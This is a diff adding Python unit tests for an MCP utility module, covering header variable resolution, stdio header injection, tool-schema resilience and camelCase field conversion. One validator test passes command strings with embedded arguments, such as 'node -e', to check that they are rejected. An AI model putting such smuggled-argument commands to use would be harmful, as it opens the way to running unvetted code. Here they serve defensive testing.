+        request_variables = {"MY_API_KEY": "resolved-key", "MY_CUSTOM": "custom-value"}  # pragma: allowlist secret
+
+        result = _resolve_global_variables_in_headers(headers, request_variables)
+
+        assert result == {
+            "x-api-key": "resolved-key",
+            "authorization": "static-token",
+            "x-custom": "custom-value",
+        }
+
+    def test_resolve_global_variables_non_string_values(self):
+        """Test that non-string header values are preserved."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {"x-api-key": "MY_KEY", "x-number": 123, "x-none": None}
+        request_variables = {"MY_KEY": "resolved"}
+
+        result = _resolve_global_variables_in_headers(headers, request_variables)
+
+        assert result == {"x-api-key": "resolved", "x-number": 123, "x-none": None}
+
+    def test_process_headers_with_request_variables_dict(self):
+        """Test _process_headers with dict input and request_variables."""
+        headers = {"x-api-key": "MY_API_KEY", "content-type": "application/json"}
+        request_variables = {"MY_API_KEY": "secret-123"}  # pragma: allowlist secret
+
+        result = _process_headers(headers, request_variables)
+
+        # Should resolve variable and normalize to lowercase
+        assert result == {"x-api-key": "secret-123", "content-type": "application/json"}
+
+    def test_process_headers_with_request_variables_list(self):
+        """Test _process_headers with list input and request_variables."""
+        headers = [
+            {"key": "x-api-key", "value": "MY_API_KEY"},
+            {"key": "Content-Type", "value": "application/json"},
+        ]
+        request_variables = {"MY_API_KEY": "secret-123"}  # pragma: allowlist secret
+
+        result = _process_headers(headers, request_variables)
+
+        # Should resolve variable and normalize to lowercase
+        assert result == {"x-api-key": "secret-123", "content-type": "application/json"}
+
+    def test_process_headers_without_request_variables(self):
+        """Test _process_headers maintains backward compatibility without request_variables."""
+        headers = {"X-API-Key": "static-value", "Content-Type": "application/json"}
+
+        result = _process_headers(headers)
+
+        # Should just normalize without resolution
+        assert result == {"x-api-key": "static-value", "content-type": "application/json"}
+
+    def test_resolve_global_variables_case_sensitive_matching(self):
+        """Test that variable name matching is case-sensitive."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {"x-api-key": "my_api_key", "x-token": "MY_API_KEY"}
+        request_variables = {"MY_API_KEY": "resolved-uppercase"}  # pragma: allowlist secret
+
+        result = _resolve_global_variables_in_headers(headers, request_variables)
+
+        # Only exact match should be resolved
+        assert result == {"x-api-key": "my_api_key", "x-token": "resolved-uppercase"}
+
+    def test_resolve_global_variables_empty_headers(self):
+        """Test resolution with empty headers."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        result = _resolve_global_variables_in_headers({}, {"VAR": "value"})
+        assert result == {}
+
+    def test_resolve_global_variables_special_characters(self):
+        """Test resolution with special characters in values."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {"authorization": "MY_TOKEN"}
+        request_variables = {"MY_TOKEN": "Bearer token-with-special!@#$%^&*()_+-=[]{}|;:,.<>?"}
+
+        result = _resolve_global_variables_in_headers(headers, request_variables)
+
+        assert result["authorization"] == "Bearer token-with-special!@#$%^&*()_+-=[]{}|;:,.<>?"
+
+
+class TestStreamableHTTPHeaderIntegration:
+    """Integration test to verify headers are properly passed through the entire StreamableHTTP flow."""
+
+    async def test_headers_processing(self):
+        """Test that headers flow properly from server config through to StreamableHTTP client connection."""
+        # Test the header processing function directly
+        headers_input = [
+            {"key": "Authorization", "value": "Bearer test-token"},
+            {"key": "X-API-Key", "value": "secret-key"},
+        ]
+
+        expected_headers = {
+            "authorization": "Bearer test-token",  # normalized to lowercase
+            "x-api-key": "secret-key",
+        }
+
+        # Test _process_headers function with validation
+        processed_headers = _process_headers(headers_input)
+        assert processed_headers == expected_headers
+
+        # Test different input formats
+        # Test dict input with validation
+        dict_headers = {"Authorization": "Bearer dict-token", "Invalid Header": "bad"}
+        result = _process_headers(dict_headers)
+        # Invalid header should be filtered out, valid header normalized
+        assert result == {"authorization": "Bearer dict-token"}
+
+        # Test None input
+        assert _process_headers(None) == {}
+
+        # Test empty list
+        assert _process_headers([]) == {}
+
+        # Test malformed list
+        malformed_headers = [{"key": "Auth"}, {"value": "token"}]  # Missing value/key
+        assert _process_headers(malformed_headers) == {}
+
+        # Test list with invalid header names
+        invalid_headers = [
+            {"key": "Valid-Header", "value": "good"},
+            {"key": "Invalid Header", "value": "bad"},  # spaces not allowed
+        ]
+        result = _process_headers(invalid_headers)
+        assert result == {"valid-header": "good"}
+
+    async def test_streamable_http_client_header_storage(self):
+        """Test that SSE client properly stores headers in connection params."""
+        streamable_http_client = MCPStreamableHttpClient()
+        test_url = "http://test.url"
+        test_headers = {"Authorization": "Bearer test123", "Custom": "value"}
+
+        # Test that headers are properly stored in connection params
+        # Set connection params as a dict like the implementation expects
+        streamable_http_client._connection_params = {
+            "url": test_url,
+            "headers": test_headers,
+            "timeout_seconds": 30,
+            "sse_read_timeout_seconds": 30,
+        }
+
+        # Verify headers are stored
+        assert streamable_http_client._connection_params["url"] == test_url
+        assert streamable_http_client._connection_params["headers"] == test_headers
+
+
+class TestUpdateToolsStdioHeaders:
+    """Test that update_tools injects component headers into stdio args."""
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_injected_with_existing_headers_flag(self, stdio_client):
+        """Headers should be injected as --headers key value before the existing --headers flag."""
+        server_config = {
+            "command": "uvx",
+            "args": [
+                "mcp-proxy",
+                "--transport",
+                "streamablehttp",
+                "--headers",
+                "x-api-key",
+                "sk-existing",
+                "http://localhost:7860/api/v1/mcp/project/test/streamable",
+            ],
+            "headers": {"Authorization": "Bearer token123"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.command == "uvx"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "authorization",
+            "Bearer token123",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost:7860/api/v1/mcp/project/test/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_injected_without_existing_headers_flag(self, stdio_client):
+        """When no --headers flag exists, headers should be inserted before the last positional arg."""
+        server_config = {
+            "command": "uvx",
+            "args": [
+                "mcp-proxy",
+                "--transport",
+                "streamablehttp",
+                "http://localhost:7860/streamable",
+            ],
+            "headers": {"X-Api-Key": "my-key"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost:7860/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_multiple_headers_each_get_own_flag(self, stdio_client):
+        """Each header should get its own --headers key value triplet."""
+        server_config = {
+            "command": "uvx",
+            "args": [
+                "mcp-proxy",
+                "--transport",
+                "streamablehttp",
+                "--headers",
+                "x-api-key",
+                "sk-existing",
+                "http://localhost/streamable",
+            ],
+            "headers": {"X-Custom-One": "val1", "X-Custom-Two": "val2"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-custom-one",
+            "val1",
+            "--headers",
+            "x-custom-two",
+            "val2",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_no_headers_leaves_args_unchanged(self, stdio_client):
+        """When no component headers are set, args should not be modified."""
+        server_config = {
+            "command": "uvx",
+            "args": ["mcp-proxy", "--transport", "streamablehttp", "http://localhost/streamable"],
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "http://localhost/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx mcp-server-fetch",
+            "node -e",
+            "npx\t-y\t@modelcontextprotocol/server-fetch",
+            "/usr/bin/node --version",
+            "C:\\Program Files\\nodejs\\node.exe --version",
+        ],
+    )
+    async def test_stdio_rejects_arguments_embedded_in_command(self, command, stdio_client):
+        """Runtime-loaded configs enforce the same single-executable command boundary."""
+        server_config = {
+            "command": command,
+            "args": [],
+        }
+
+        with pytest.raises(ValueError, match="single executable"):
+            await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params is None
+
+    @pytest.mark.asyncio
+    async def test_stdio_preserves_executable_path_with_spaces(self, stdio_client):
+        """A platform path stays one argv entry while args remain separate."""
+        command = "C:\\Program Files\\nodejs\\node.exe"
+
+        server_config = {
+            "command": command,
+            "args": ["server.js", "--timeout", "30"],
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.command == command
+        assert stdio_client._connection_params.args == ["server.js", "--timeout", "30"]
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_appended_when_all_args_are_flags(self, stdio_client):
+        """When all args are flags (no positional URL), headers should be appended."""
+        server_config = {
+            "command": "uvx",
+            "args": ["--verbose", "--isolated"],
+            "headers": {"Authorization": "Bearer tok"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "--verbose",
+            "--isolated",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_appended_when_last_token_is_flag_value(self, stdio_client):
+        """When the last token is a flag's value, headers should be appended, not inserted before it."""
+        server_config = {
+            "command": "uvx",
+            "args": ["--color", "always"],
+            "headers": {"Authorization": "Bearer tok"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "--color",
+            "always",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self, stdio_client):
+        """Headers should be inserted before the last positional arg even when flag+value pairs precede it."""
+        server_config = {
+            "command": "uvx",
+            "args": ["mcp-proxy", "--port", "8080", "http://localhost/streamable"],
+            "headers": {"X-Api-Key": "my-key"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--port",
+            "8080",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_headers_inserted_before_last_positional_with_multiple_positionals(self, stdio_client):
+        """When multiple positional args exist, headers are inserted before the last one."""
+        server_config = {
+            "command": "uvx",
+            "args": ["mcp-proxy", "--transport", "streamablehttp", "extra-pos-arg", "http://localhost/streamable"],
+            "headers": {"X-Key": "val"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "extra-pos-arg",
+            "--headers",
+            "x-key",
+            "val",
+            "http://localhost/streamable",
+        ]
+
+    @pytest.mark.asyncio
+    async def test_stdio_does_not_mutate_original_config(self, stdio_client):
+        """The original server_config args list should not be mutated."""
+        original_args = ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
+        server_config = {
+            "command": "uvx",
+            "args": original_args,
+            "headers": {"X-Extra": "val"},
+        }
+
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
+
+        # Original list should be unchanged
+        assert original_args == ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
+
+
+class TestUpdateToolsPerToolResilience:
+    """update_tools must isolate per-tool schema-parsing failures (#11229)."""
+
+    @staticmethod
+    def _make_tool(name: str, schema: dict) -> MagicMock:
+        tool = MagicMock()
+        tool.name = name
+        tool.description = f"{name} description"
+        tool.inputSchema = schema
+        tool.outputSchema = None
+        return tool
+
+    @pytest.mark.asyncio
+    async def test_one_bad_tool_does_not_drop_the_other_tools_issue_11229(self):
+        """One bad schema must not abort the listing; the bad tool must be logged by name."""
+        good_tool_a = self._make_tool(
+            "good_a",
+            {"type": "object", "properties": {"q": {"type": "string"}}, "required": ["q"]},
+        )
+        bad_tool = self._make_tool(
+            "bad_linear_like",
+            {"type": "object", "properties": {"x": {"type": "string"}}},
+        )
+        good_tool_b = self._make_tool(
+            "good_b",
+            {"type": "object", "properties": {"n": {"type": "integer"}}, "required": ["n"]},
+        )
+
+        mock_stdio = AsyncMock(spec=MCPStdioClient)
+        mock_stdio.connect_to_server.return_value = [good_tool_a, bad_tool, good_tool_b]
+        mock_stdio._connected = True
+
+        from lfx.schema.json_schema import create_input_schema_from_json_schema as real_converter
+
+        def selective_converter(schema):
+            if schema is bad_tool.inputSchema:
+                msg = "unhashable type: 'list'"
+                raise TypeError(msg)
+            return real_converter(schema)
+
+        with (
+            patch("lfx.base.mcp.util.create_input_schema_from_json_schema", side_effect=selective_converter),
+            patch("lfx.base.mcp.util.logger") as mock_logger,
+        ):
+            mode, tool_list, tool_cache = await update_tools(
+                server_name="linear-like",
+                server_config={"command": "uvx", "args": []},
+                mcp_stdio_client=mock_stdio,
+            )
+
+        loaded_names = [t.name for t in tool_list]
+        assert "good_a" in loaded_names
+        assert "good_b" in loaded_names
+        assert "bad_linear_like" not in loaded_names
+        assert set(tool_cache.keys()) == {"good_a", "good_b"}
+        assert mode == "Stdio"
+
+        all_log_calls = (
+            mock_logger.error.call_args_list + mock_logger.warning.call_args_list + mock_logger.exception.call_args_list
+        )
+        joined = " | ".join(str(call) for call in all_log_calls)
+        assert "bad_linear_like" in joined, f"failing tool name must appear in log; got: {joined!r}"
+
+    @pytest.mark.asyncio
+    async def test_resilience_under_many_mixed_tools(self):
+        """Stress: 20 tools, 10 healthy + 10 broken with varied error types — all 10 good survive."""
+        from lfx.schema.json_schema import create_input_schema_from_json_schema as real_converter
+
+        error_types = [TypeError, AttributeError, KeyError, NameError, RecursionError]
+        tools = []
+        bad_schemas: dict[int, type[Exception]] = {}
+        for i in range(20):
+            schema = {
+                "type": "object",
+                "properties": {"k": {"type": "string"}},
+                "required": ["k"],
+            }
+            tool = self._make_tool(f"tool_{i:02d}", schema)
+            tools.append(tool)
+            if i % 2 == 1:  # 10 odd indices fail with rotated error types
+                bad_schemas[id(schema)] = error_types[(i // 2) % len(error_types)]
+
+        def selective_converter(schema):
+            err_cls = bad_schemas.get(id(schema))
+            if err_cls is not None:
+                msg = f"simulated {err_cls.__name__}"
+                raise err_cls(msg)
+            return real_converter(schema)
+
+        mock_stdio = AsyncMock(spec=MCPStdioClient)
+        mock_stdio.connect_to_server.return_value = tools
+        mock_stdio._connected = True
+
+        with patch("lfx.base.mcp.util.create_input_schema_from_json_schema", side_effect=selective_converter):
+            _, tool_list, tool_cache = await update_tools(
+                server_name="stress",
+                server_config={"command": "uvx", "args": []},
+                mcp_stdio_client=mock_stdio,
+            )
+
+        loaded = {t.name for t in tool_list}
+        expected_good = {f"tool_{i:02d}" for i in range(20) if i % 2 == 0}
+        assert loaded == expected_good, f"expected exactly the 10 healthy tools, got {loaded}"
+        assert set(tool_cache.keys()) == expected_good
+
+
+class TestFieldNameConversion:
+    """Test camelCase to snake_case field name conversion functionality."""
+
+    def test_camel_to_snake_basic(self):
+        """Test basic camelCase to snake_case conversion."""
+        assert util._camel_to_snake("weatherMain") == "weather_main"
+        assert util._camel_to_snake("topN") == "top_n"
+        assert util._camel_to_snake("firstName") == "first_name"
+        assert util._camel_to_snake("lastName") == "last_name"
+
+    def test_camel_to_snake_edge_cases(self):
+        """Test edge cases for camelCase conversion."""
+        # Already snake_case should remain unchanged
+        assert util._camel_to_snake("snake_case") == "snake_case"
+        assert util._camel_to_snake("already_snake") == "already_snake"
+
+        # Single word should remain unchanged
+        assert util._camel_to_snake("simple") == "simple"
+        assert util._camel_to_snake("UPPER") == "upper"
+
+        # Multiple consecutive capitals
+        assert util._camel_to_snake("XMLHttpRequest") == "xmlhttp_request"
+        assert util._camel_to_snake("HTTPSConnection") == "httpsconnection"
+
+        # Numbers
+        assert util._camel_to_snake("version2Beta") == "version2_beta"
+        assert util._camel_to_snake("test123Value") == "test123_value"
+
+    def test_convert_field_names_exact_match(self):
+        """Test field name conversion when fields already match schema."""
+        from pydantic import Field, create_model
+
+        # Create test schema with snake_case fields
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+        )
+
+        # Input with exact field names should pass through unchanged
+        input_args = {"weather_main": "Snow", "top_n": 6}
+        result = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        assert result == {"weather_main": "Snow", "top_n": 6}
+
+    def test_convert_field_names_camel_to_snake(self):
+        """Test field name conversion from camelCase to snake_case."""
+        from pydantic import Field, create_model
+
+        # Create test schema with snake_case fields
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+            user_id=(str, Field(..., description="User identifier")),
+        )
+
+        # Input with camelCase field names
+        input_args = {"weatherMain": "Snow", "topN": 6, "userId": "user123"}
+        result = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        assert result == {"weather_main": "Snow", "top_n": 6, "user_id": "user123"}
+
+    def test_convert_field_names_mixed_case(self):
+        """Test field name conversion with mixed naming conventions."""
+        from pydantic import Field, create_model
+
+        # Create test schema with mixed field names
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            topN=(int, Field(..., description="Number of results")),  # Already camelCase in schema
+            user_count=(int, Field(..., description="User count")),
+        )
+
+        # Input with mixed naming
+        input_args = {"weatherMain": "Snow", "topN": 6, "user_count": 42}
+        result = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        # weather_main should be converted, topN should match exactly, user_count should match exactly
+        assert result == {"weather_main": "Snow", "topN": 6, "user_count": 42}
+
+    def test_convert_field_names_no_match(self):
+        """Test field name conversion with fields that don't match schema."""
+        from pydantic import Field, create_model
+
+        # Create test schema
+        test_schema = create_model("TestSchema", expected_field=(str, Field(..., description="Expected field")))
+
+        # Input with unrecognized field names
+        input_args = {"unknownField": "value", "anotherField": "value2"}
+        result = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        # Fields that don't match should be kept as-is (validation will catch errors)
+        assert result == {"unknownField": "value", "anotherField": "value2"}
+
+    def test_convert_field_names_empty_input(self):
+        """Test field name conversion with empty input."""
+        from pydantic import Field, create_model
+
+        test_schema = create_model("TestSchema", test_field=(str, Field(..., description="Test field")))
+
+        # Empty input should return empty result
+        result = util._convert_camel_case_to_snake_case({}, test_schema)
+        assert result == {}
+
+    def test_field_conversion_in_tool_validation(self):
+        """Test that field conversion works end-to-end with Pydantic validation."""
+        from pydantic import Field, create_model
+
+        # Create test schema matching the original error case
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of top results")),
+        )
+
+        # Original error case: camelCase input
+        input_args = {"weatherMain": "Snow", "topN": 6}
+        converted_args = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        # Should validate successfully with converted field names
+        validated = test_schema.model_validate(converted_args)
+        assert validated.weather_main == "Snow"
+        assert validated.top_n == 6
+        assert validated.model_dump() == {"weather_main": "Snow", "top_n": 6}
+
+    def test_field_conversion_preserves_values(self):
+        """Test that field conversion preserves all value types correctly."""
+        from pydantic import Field, create_model
+
+        test_schema = create_model(
+            "TestSchema",
+            string_field=(str, Field(...)),
+            int_field=(int, Field(...)),
+            bool_field=(bool, Field(...)),
+            list_field=(list, Field(...)),
+            dict_field=(dict, Field(...)),
+        )
+
+        input_args = {
+            "stringField": "test_string",
+            "intField": 42,
+            "boolField": True,
+            "listField": [1, 2, 3],
+            "dictField": {"nested": "value"},
+        }
+
+        result = util._convert_camel_case_to_snake_case(input_args, test_schema)
+
+        expected = {
+            "string_field": "test_string",
+            "int_field": 42,
+            "bool_field": True,
+            "list_field": [1, 2, 3],
+            "dict_field": {"nested": "value"},
+        }
+
+        assert result == expected
+
+    def test_json_schema_alias_functionality(self):
+        """Test that JSON schema creation includes aliases for camelCase field names."""
+        from lfx.schema.json_schema import create_input_schema_from_json_schema
+        from pydantic import ValidationError
+
+        # Create a JSON schema with snake_case field names
+        test_schema = {
+            "type": "object",
+            "properties": {
+                "weather_main": {"type": "string", "description": "Main weather condition"},
+                "top_n": {"type": "integer", "description": "Number of results"},
+                "user_id": {"type": "string", "description": "User identifier"},
+            },
+            "required": ["weather_main", "top_n"],
+        }
+
+        # Create the Pydantic model using our function
+        input_schema = create_input_schema_from_json_schema(test_schema)
+
+        # Test with snake_case field names (should work)
+        result1 = input_schema(weather_main="Rain", top_n=8)
+        assert result1.weather_main == "Rain"
+        assert result1.top_n == 8
+
+        # Test with camelCase field names (should also work due to aliases)
+        result2 = input_schema(weatherMain="Rain", topN=8)
+        assert result2.weather_main == "Rain"
+        assert result2.top_n == 8
+
+        # Test with mixed case field names (should work)
+        result3 = input_schema(weatherMain="Rain", top_n=8, userId="user123")
+        assert result3.weather_main == "Rain"
+        assert result3.top_n == 8
+        assert result3.user_id == "user123"
+
+        # Test validation error (should fail with missing required field)
+        with pytest.raises(ValidationError):
+            input_schema(weatherMain="Rain")  # Missing topN/top_n
+
+    @pytest.mark.asyncio
+    async def test_tool_empty_arguments_error_handling(self):
+        """Test that tools provide helpful error messages when called with no arguments."""
+        from unittest.mock import AsyncMock
+
+        from lfx.schema.json_schema import create_input_schema_from_json_schema
+
+        # Create a JSON schema with required fields
+        test_schema = {
+            "type": "object",
+            "properties": {
+                "weather_main": {"type": "string", "description": "Main weather condition"},
+                "top_n": {"type": "integer", "description": "Number of results"},
+            },
+            "required": ["weather_main", "top_n"],
+        }
+
+        # Create the Pydantic model using our function
+        input_schema = create_input_schema_from_json_schema(test_schema)
+
+        # Create a mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="Success")
+
+        # Create the tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", input_schema, mock_client)
+
+        # Test that calling with no arguments gives a helpful error message
+        with pytest.raises(ValueError, match="requires arguments but none were provided") as exc_info:
+            await tool_coroutine()
+
+        error_msg = str(exc_info.value)
+        assert "test_tool" in error_msg
+        assert "requires arguments but none were provided" in error_msg
+        assert "weather_main" in error_msg
+        assert "top_n" in error_msg
+
+        # Test that calling with correct arguments works
+        result = await tool_coroutine(weather_main="Rain", top_n=8)
+        assert result == "Success"
+
+
+class TestToolExecutionWithFieldConversion:
+    """Test that field name conversion works in actual tool execution."""
+
+    def test_create_tool_coroutine_with_camel_case_fields(self):
+        """Test that create_tool_coroutine handles camelCase field conversion."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        # Create test schema with snake_case fields
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="tool_result")
+
+        # Create tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", test_schema, mock_client)
+
+        # Test that it's actually a coroutine function
+        import asyncio
+
+        assert asyncio.iscoroutinefunction(tool_coroutine)
+
+    def test_create_tool_func_with_camel_case_fields(self):
+        """Test that create_tool_func handles camelCase field conversion."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        # Create test schema with snake_case fields
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+        )
+
+        # Mock client with async run_tool method
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="tool_result")
+
+        # Create tool function
+        tool_func = util.create_tool_func("test_tool", test_schema, mock_client)
+
+        # Mock run_until_complete from async_helpers
+        with patch("lfx.base.mcp.util.run_until_complete", return_value="tool_result") as mock_run_until_complete:
+            # Test with camelCase arguments
+            result = tool_func(weatherMain="Snow", topN=6)
+
+            assert result == "tool_result"
+            # Verify that run_until_complete was called
+            mock_run_until_complete.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_tool_coroutine_field_conversion_end_to_end(self):
+        """Test end-to-end field conversion in tool coroutine."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        # Create test schema with snake_case fields (matching original error case)
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="success")
+
+        # Create tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", test_schema, mock_client)
+
+        # Test with camelCase keyword arguments (the problematic case)
+        result = await tool_coroutine(weatherMain="Snow", topN=6)
+
+        assert result == "success"
+        # Verify client was called with converted field names
+        mock_client.run_tool.assert_called_once_with("test_tool", arguments={"weather_main": "Snow", "top_n": 6})
+
+    @pytest.mark.asyncio
+    async def test_tool_coroutine_positional_args_no_conversion(self):
+        """Test that positional arguments work correctly without field conversion."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="success")
+
+        # Create tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", test_schema, mock_client)
+
+        # Test with positional arguments
+        result = await tool_coroutine("Snow", 6)
+
+        assert result == "success"
+        # Verify client was called with correct field mapping
+        mock_client.run_tool.assert_called_once_with("test_tool", arguments={"weather_main": "Snow", "top_n": 6})
+
+    @pytest.mark.asyncio
+    async def test_tool_coroutine_mixed_args_and_conversion(self):
+        """Test mixed positional and keyword arguments with field conversion."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+            user_id=(str, Field(..., description="User ID")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="success")
+
+        # Create tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", test_schema, mock_client)
+
+        # Test with one positional arg and camelCase keyword args
+        result = await tool_coroutine("Snow", topN=6, userId="user123")
+
+        assert result == "success"
+        # Verify field names were properly converted
+        mock_client.run_tool.assert_called_once_with(
+            "test_tool", arguments={"weather_main": "Snow", "top_n": 6, "user_id": "user123"}
+        )
+
+    @pytest.mark.asyncio
+    async def test_tool_coroutine_validation_error_with_conversion(self):
+        """Test that validation errors are properly handled after field conversion."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        test_schema = create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Required field")),
+            top_n=(int, Field(..., description="Required field")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+
+        # Create tool coroutine
+        tool_coroutine = util.create_tool_coroutine("test_tool", test_schema, mock_client)
+
+        # Test with missing required field (should fail validation even after conversion)
+        with pytest.raises(ValueError, match="Invalid input"):
+            await tool_coroutine(weatherMain="Snow")  # Missing topN/top_n
+
+    def test_tool_func_field_conversion_sync(self):
+        """Test that create_tool_func handles field conversion in sync context."""
+        from unittest.mock import AsyncMock
+
+        from pydantic import Field, create_model
+
+        test_schema = create_model(
+            "TestSchema",
+            user_name=(str, Field(..., description="User name")),
+            max_results=(int, Field(..., description="Maximum results")),
+        )
+
+        # Mock client
+        mock_client = AsyncMock()
+        mock_client.run_tool = AsyncMock(return_value="sync_result")
+
+        # Create tool function
+        tool_func = util.create_tool_func("test_tool", test_schema, mock_client)
+
+        # Mock run_until_complete from async_helpers
+        with patch("lfx.base.mcp.util.run_until_complete", return_value="sync_result") as mock_run_until_complete:
+            # Test with camelCase fields
+            result = tool_func(userName="testuser", maxResults=10)
+
+            assert result == "sync_result"
+            mock_run_until_complete.assert_called_once()
+
+
+class TestMCPUtilityFunctions:
+    """Test utility functions from util.py that don't have dedicated test classes."""
+
+    def test_sanitize_mcp_name(self):
+        """Test MCP name sanitization."""
+        assert util.sanitize_mcp_name("Test Name 123") == "test_name_123"
+        assert util.sanitize_mcp_name("  ") == ""
+        assert util.sanitize_mcp_name("123abc") == "_123abc"
+        assert util.sanitize_mcp_name("Tést-😀-Námé") == "test_name"
+        assert util.sanitize_mcp_name("a" * 100) == "a" * 46
+
+    def test_sanitize_mcp_name_still_collapses_non_ascii_for_tool_names(self):
+        """Tool names must satisfy the ASCII schema LLM providers enforce, so this stays as is."""
+        assert util.sanitize_mcp_name("\u7e41\u9ad4\u4e2d\u6587\u5c08\u6848") == "unnamed"
+
+    def test_project_mcp_server_name_keeps_non_latin_scripts(self):
+        """CJK, kana and Hangul used to collapse onto lf-unnamed and collide with each other."""
+        assert (
+            util.project_mcp_server_name("\u7e41\u9ad4\u4e2d\u6587\u5c08\u6848")
+            == "lf-\u7e41\u9ad4\u4e2d\u6587\u5c08\u6848"
+        )
+        assert (
+            util.project_mcp_server_name("\u30d7\u30ed\u30b8\u30a7\u30af\u30c8")
+            == "lf-\u30d7\u30ed\u30b8\u30a7\u30af\u30c8"
+        )
+        assert (
+            util.project_mcp_server_name("\ud55c\uad6d\uc5b4 \ud504\ub85c\uc81d\ud2b8")
+            == "lf-\ud55c\uad6d\uc5b4_\ud504\ub85c\uc81d\ud2b8"
+        )
